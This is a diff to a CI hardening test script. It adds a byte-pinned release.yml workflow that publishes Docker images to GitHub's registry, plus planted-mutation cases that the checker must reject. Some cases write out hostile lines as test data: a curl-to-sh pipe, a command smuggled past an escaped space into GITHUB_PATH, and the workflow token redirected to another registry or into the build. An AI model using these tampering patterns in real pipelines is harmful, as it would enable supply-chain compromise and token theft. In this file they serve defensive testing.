@@ -7781,7 +7781,8 @@ out=$(python3 -I "$ld/land.py" feat 2>&1) && fail "land took an argument: $out"
 fi
 
 if part ci; then
-# GitHub judges main: the two workflows read the repository and nothing more, pin every action and
+# GitHub judges main: the gate and the night read the repository and nothing more, release.yml writes main's images and
+# nothing else; all pin every action and
 # download, run on a pull request, a push to main or by hand and never on a fork's privileged events, and hand their verdict to one
 # job, gate-ok, the one check main requires. What judges a change comes from the commit it is judged against,
 # and CODEOWNERS holds the core. The checker reads the promises without comments and the bans with them; each known bypass
@@ -7792,7 +7793,7 @@ root = pathlib.Path(sys.argv[1])
 gh = root / ".github"
 wf = gh / "workflows"
 names = sorted(p.name for p in wf.iterdir())
-assert names == ["gate.yml", "nightly.yml"], f"the workflows are {names}: one no promise reads"
+assert names == ["gate.yml", "nightly.yml", "release.yml"], f"the workflows are {names}: one no promise reads"
 assert not (gh / "actions").exists(), "a local action: GitHub's workflow right may not cover it, so the agent could change it"
 assert not any((d / n).exists() for d in (root, gh) for n in ("zizmor.yml", "zizmor.yaml", ".zizmor.yml")), "a zizmor config could silence it"
 strip = lambda text: re.sub(r"(?:^|[ \t])#.*$", "", text, flags=re.M)
@@ -7824,9 +7825,12 @@ def conditions(job):
     return [bare(c) for c in re.findall(r"^    if:(.*)$", job, re.M)], [bare(c) for c in re.findall(r"^ {6,}(?:- )?if:(.*)$", job, re.M)]
 pnpm = json.loads((root / "package.json").read_text())["packageManager"].split("@")[1]
 required = ast.literal_eval(re.search(r"^REQUIRED = (\{.*?^\})", (root / "scripts" / "ci_gate_ok.py").read_text(), re.M | re.S).group(1))
-TRIGGERS = {"gate.yml": ["pull_request", "push", "workflow_dispatch"], "nightly.yml": ["schedule", "workflow_dispatch"]}
-WRITES = {"gate.yml": [], "nightly.yml": ["issues"]}
-TOKENS = {"gate.yml": 0, "nightly.yml": 1}
+TRIGGERS = {"gate.yml": ["pull_request", "push", "workflow_dispatch"], "nightly.yml": ["schedule", "workflow_dispatch"],
+            "release.yml": ["push", "workflow_dispatch"]}
+WRITES = {"gate.yml": [], "nightly.yml": ["issues"], "release.yml": ["packages"]}
+TOKENS = {"gate.yml": 0, "nightly.yml": 1, "release.yml": 1}
+# The workflows that run the repository's code install it from the lockfile; release.yml builds images and installs nothing.
+INSTALLS = {"gate.yml", "nightly.yml"}
 STEP_IFS = {"failure()", "needs.changes.outputs.ui == 'true' || needs.changes.outputs.harness == 'true'",
             "needs.changes.outputs.nginx == 'true'", "needs.changes.outputs.migrations == 'true'"}
 for name in names:
@@ -7846,7 +7850,7 @@ for name in names:
     assert not re.search(r"\b(?:npm|yarn|gem|cargo|go)\s+(?:install|add|exec|dlx|get|ci)\b|\bnpx\b|\bpnpm\s+(?:add|dlx)\b|\b(?:uvx?|pipx)\s|\bgo run \S*@", raw), f"{name}: it installs or runs a package outside the lockfile"
     assert all(m == " --no-deps --require-hashes -r" for m in re.findall(r"\bpip3?\s+install((?:\s+-\S+)*)", raw)), f"{name}: a pip install without its hashes"
     installs = re.findall(r"pnpm\"?\s+install(\s+--frozen-lockfile)?", raw)
-    assert installs and all(installs), f"{name}: a pnpm install outside the lockfile"
+    assert all(installs) and bool(installs) == (name in INSTALLS), f"{name}: a pnpm install outside the lockfile, or one where none belongs"
     lines = raw.split("\n")
     for k, line in enumerate(lines):
         if re.search(r"\bcurl\b", line):
@@ -7871,6 +7875,80 @@ for name in names:
         t = re.search(r"^    timeout-minutes: (\d+)$", text, re.M)
         budget = 355 if name == "nightly.yml" else 40 if job == "deploy-stack" else 30 if job == "risk" else 15
         assert t and int(t.group(1)) <= budget, f"{name}: {job} has no time limit, or one past its {budget} min"
+# release.yml is the one workflow that writes, so it is held to its every byte: a change to it, a comment or a space
+# included, fails here until this copy changes with it. Its one line of images alone is free, held to the Dockerfiles
+# the stack builds, which all build in one plain form.
+RELEASE = r"""# Main's images on GitHub's packages. Each push to main, or a run by hand from main, builds every image the stack builds
+# (deploy/compose.yaml) for linux/amd64 and pushes it as ghcr.io/<owner>/<repository>/<image>:<the commit's first 12 hex>,
+# once: a tag that exists is never pushed again. Its one job writes packages and nothing else; the run's token is named in
+# the push step alone, never in the build (the pinned checkout keeps it off the disk). No build cache: every image starts
+# from its pinned base images. scripts/test_hooks.sh, section ci, holds this file to its every byte.
+name: release
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+permissions:
+  contents: read
+concurrency:
+  # One run of a commit at a time: two cannot both find its tag absent and both push.
+  group: release-${{ github.sha }}
+  cancel-in-progress: false
+jobs:
+  images:
+    name: image ${{ matrix.image }}
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    permissions:
+      contents: read
+      # Pushes this job's one image to the repository's packages.
+      packages: write
+    strategy:
+      fail-fast: false
+      matrix:
+        image: [...]
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+      - name: Build the image, labelled with its source and commit
+        env:
+          IMAGE: ${{ matrix.image }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+        run: |
+          set -eu
+          docker build --pull --platform linux/amd64 --file "deploy/${IMAGE}/Dockerfile" \
+            --label "org.opencontainers.image.source=https://github.com/${REPO}" \
+            --label "org.opencontainers.image.revision=${SHA}" \
+            --tag "release:${IMAGE}" .
+      - name: Push it under the commit, unless that tag exists
+        env:
+          IMAGE: ${{ matrix.image }}
+          REPO: ${{ github.repository }}
+          SHA: ${{ github.sha }}
+          ACTOR: ${{ github.actor }}
+          TOKEN: ${{ github.token }}
+        run: |
+          set -eu
+          ref="ghcr.io/${REPO,,}/${IMAGE}:${SHA:0:12}"
+          printf '%s' "$TOKEN" | docker login ghcr.io --username "$ACTOR" --password-stdin
+          trap 'docker logout ghcr.io' EXIT
+          if docker manifest inspect "$ref" >/dev/null 2>&1; then
+            echo "$ref exists: left as it is"
+            exit 0
+          fi
+          docker tag "release:${IMAGE}" "$ref"
+          docker push "$ref"
+"""
+rel = (wf / "release.yml").read_bytes().decode("utf-8")
+assert re.sub(r"(?m)^(        image: \[)[\w, -]*\]$", r"\1...]", rel) == RELEASE, "release.yml: it differs from the text this checker holds it to"
+compose = (root / "deploy" / "compose.yaml").read_text()
+plain = re.findall(r"^    build:\n      context: \.\.\n      dockerfile: deploy/([\w-]+)/Dockerfile\n(?!      )", compose, re.M)
+assert plain and len(plain) == len(re.findall(r"^[ \t]*build:", compose, re.M)), "deploy/compose.yaml: a service builds in a form release.yml's list is not held to"
+listed = re.search(r"^        image: \[([\w, -]*)\]$", rel, re.M)
+assert listed and sorted(i.strip() for i in listed.group(1).split(",")) == sorted(set(plain)), f"release.yml: its images are not the stack's {sorted(set(plain))}"
 gate = strip((wf / "gate.yml").read_text())
 J = jobs(gate)
 assert "  group: gate-${{ github.event.pull_request.number || (github.event_name == 'push' && github.run_id) || github.ref }}\n  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n" in gate, "gate.yml may cancel or leave pending a run of main, or one pull request's run another's"
@@ -8034,6 +8112,7 @@ python3 -I - "$here/.." "$t/ci_static.py" "$t/ci_plant" <<'PY' || fail "a plante
 import pathlib, shutil, subprocess, sys
 root, checker, plant = pathlib.Path(sys.argv[1]), sys.argv[2], pathlib.Path(sys.argv[3])
 G, N, O, K, F = ".github/workflows/gate.yml", ".github/workflows/nightly.yml", ".github/CODEOWNERS", "scripts/ci_gate_ok.py", ".github/failures.json"
+R, D = ".github/workflows/release.yml", "deploy/compose.yaml"
 JS, V, B = ".jscpd.json", "vitest.config.ts", "app/tests/stories/behaviours.spec.ts"
 CASES = [
     (G, "        run: pnpm run format:check\n", '        run: echo " #"; curl -sSL https://example.com/x | sh\n', "a pipe to a shell behind a quoted #"),
@@ -8103,11 +8182,48 @@ CASES = [
     (G, "        run: pnpm run copies\n", "        env:\n          CTX: ${{ toJSON(github) }}\n        run: pnpm run copies\n", "the github context whole"),
     (G, "        run: pnpm run unused\n", "        env:\n          T: ${{ github[format('{0}', 'token')] }}\n        run: pnpm run unused\n", "the token by a formatted index"),
     (G, "        run: python3 -I scripts/check_css.py\n", "        env:\n          CTX: ${{ toJSON(github.*) }}\n        run: python3 -I scripts/check_css.py\n", "every value of the github context"),
+    (R, "    if: github.ref == 'refs/heads/main'\n", "", "an image published from any ref"),
+    (R, "    branches: [main]\n", "    branches: ['**']\n", "a push to any branch publishing"),
+    (R, "  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request:\n", "a pull request publishing"),
+    (R, "          docker build ", "          docker build --cache-from type=gha ", "a build cache feeding a published image"),
+    (R, ", link-reader]", "]", "an image the stack builds left unpublished"),
+    (R, "      packages: write\n", "      packages: write\n      contents: write\n", "a second write right"),
+    (R, "          IMAGE: ${{ matrix.image }}\n", "          IMAGE: ${{ matrix.image }}\n          T: ${{ github.token }}\n", "the token handed to the build"),
+    (R, "          docker build ", '          "$RUNNER_TEMP/pnpm/pnpm" install --frozen-lockfile\n          docker build ', "an install in the release"),
+    (R, "        image: [web, server, ergo, egress, jarvis, jarvis-reader, link-reader]\n", "        image: [web, server, ergo, egress, jarvis, jarvis-reader, link-reader]\n        exclude:\n          - image: web\n", "an image dropped by a matrix exclude"),
+    (R, "      - name: Push it under the commit, unless that tag exists\n", "      - name: Push it under the commit, unless that tag exists\n        if: matrix.image != 'server'\n", "an image's push skipped by a step's if"),
+    (R, "          docker build ", "          docker build --build-arg TOKEN ", "the build reading the token from the environment"),
+    (R, "          docker build ", "          docker build --secret id=t,env=TOKEN ", "the build reading the token as a secret"),
+    (R, "          docker tag ", '          docker build --tag "$ref" .\n          docker tag ', "a build in the step that holds the token"),
+    (R, "      packages: write\n", "      packages: write\n      id-token: 'write'\n", "a quoted write right"),
+    (R, "jobs:\n  images:\n", "jobs:\n  mint:\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n    permissions: {contents: write, id-token: write}\n    steps:\n      - run: echo\n  images:\n", "a second job with rights in flow form"),
+    (R, "    strategy:\n", "    env:\n      T: ${{ github.token }}\n    strategy:\n", "the token set for the whole job"),
+    (D, "    build:\n      context: ..\n      dockerfile: deploy/web/Dockerfile\n", "    build: ../deploy/web\n", "a service built in a form the list is not held to"),
+    (D, "      dockerfile: deploy/web/Dockerfile\n", "      dockerfile: deploy/web/Dockerfile\n      target: build\n", "a service built to a target the release does not build"),
+    (D, "  ergo:\n", "  extra:\n    build: ../deploy/extra\n  ergo:\n", "a new service in a build form the list does not read"),
+    (R, '          if docker manifest inspect "$ref" >/dev/null 2>&1; then\n            echo "$ref exists: left as it is"\n            exit 0\n          fi\n', "", "a tag pushed again over itself"),
+    (R, '          docker push "$ref"\n', '          docker push "$ref"\n          docker tag "$ref" "${ref%:*}:latest"\n          docker push "${ref%:*}:latest"\n', "a moving tag beside the commit's"),
+    (R, '          docker push "$ref"\n', "", "a green job that pushes nothing"),
+    (R, "          set -eu\n          ref=", "          set -eu\n          exit 0\n          ref=", "the push step left before it pushes"),
+    (R, "docker login ghcr.io --username", "docker login registry.example.com --username", "the token sent to another registry"),
+    (R, '--file "deploy/${IMAGE}/Dockerfile"', '--file "deploy/web/Dockerfile"', "one image published under every name"),
+    (R, '            --tag "release:${IMAGE}" .\n', '            --tag "release:${IMAGE}" . || true\n', "a failed build that goes on"),
+    (R, '            --label "org.opencontainers.image.revision=${SHA}" \\\n', '            --label "x #" --cache-from type=registry,ref=ghcr.io/o/r/cache \\\n            --label "org.opencontainers.image.revision=${SHA}" \\\n', "a cache hidden behind a quoted #"),
+    (R, "      - name: Push it under the commit, unless that tag exists\n", "      - uses: docker/build-push-action@0000000000000000000000000000000000000000\n        with:\n          build-args: T=x\n      - name: Push it under the commit, unless that tag exists\n", "another action building with its own inputs"),
+    (R, '            --label "org.opencontainers.image.source=https://github.com/${REPO}" \\\n', '            --label "org.opencontainers.image.source=https://github.com/${REPO}" \\ #||:;echo "$RUNNER_TEMP">>"$GITHUB_PATH";docker build \\\n', "a command after an escaped space that reads as a comment"),
+    (R, '--file "deploy/${IMAGE}/Dockerfile" \\\n', '--file "deploy/${IMAGE}/Dockerfile" \\ \n', "a space after a line's continuation"),
+    (R, '            --label "org.opencontainers.image.revision=${SHA}" \\\n', '            --label "org.opencontainers.image.revision=${SHA}" \\\n            # a line in the middle of the command\n', "a comment line inside a continued command"),
+    (R, "        image: [web, server, ergo, egress, jarvis, jarvis-reader, link-reader]\n", '        image: ["x\n        image: [web, server, ergo, egress, jarvis, jarvis-reader, link-reader] #", evil]\n', "a list of images hidden in a quoted string"),
+    (R, "  # One run of a commit at a time", "  # Any run", "a comment changed"),
+    (R, "name: release\n", "name: release\r\n", "a carriage return text mode would read as nothing"),
+    (D, "\nservices:\n", "\nx-extra: &extra\n  build:\n    context: ..\n    dockerfile: deploy/extra/Dockerfile\nservices:\n  extra: {<<: *extra}\n", "a service built through a merge key"),
+    (N, '"$RUNNER_TEMP/pnpm/pnpm" install --frozen-lockfile', "true", "the night without its locked install"),
+    (G, '"$RUNNER_TEMP/pnpm/pnpm" install --frozen-lockfile', "true", "the gate without its locked install"),
 ]
 def copy_of(name):
     copy = plant / name
     for part in (".github", "package.json", ".jscpd.json", "vitest.config.ts", "app/tests", "scripts/ci_gate_ok.py", "scripts/ci_changes.sh",
-                 ".githooks/records.sh", "link-reader/package.json", "deploy/test.sh", "scripts/test_hooks.sh"):
+                 ".githooks/records.sh", "link-reader/package.json", "deploy/test.sh", "deploy/compose.yaml", "scripts/test_hooks.sh"):
         (copy / part).parent.mkdir(parents=True, exist_ok=True)
         (shutil.copytree if (root / part).is_dir() else shutil.copy)(root / part, copy / part)
     return copy
